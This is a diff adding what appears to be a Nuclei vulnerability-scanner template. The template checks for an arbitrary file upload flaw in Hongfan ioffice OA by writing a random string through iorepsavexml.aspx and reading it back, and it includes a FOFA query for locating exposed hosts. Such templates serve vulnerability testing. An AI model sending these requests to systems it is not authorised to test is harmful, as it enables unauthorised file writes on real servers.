@@ -1,0 +1,41 @@
+id: hongfan-ioffice-iorepsavexml-fileupload
+info:
+  name: 红帆 ioffice iorepsavexml.aspx - fileupload
+  author: leadlife
+  severity: critical
+  description: 
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E7%BA%A2%E5%B8%86OA%20iorepsavexml.aspx%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    fofa-query: app="红帆-ioffice"
+  tags: hongfan,fileupload,oa
+
+variables:
+  filename: "{{to_lower(rand_base(4))}}"
+
+http:
+  - raw:
+      - |
+        POST /ioffice/prg/set/report/iorepsavexml.aspx?key=writefile&filename={{filename}}.txt&filepath=/upfiles/rep/pic/ HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 0
+
+        {{randstr}}
+
+      - |+
+        GET /ioffice/upfiles/rep/pic/{{filename}}.txt HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200 && status_code_2 == 200
+          - contains(body_2,'{{randstr}}')
+        condition: and
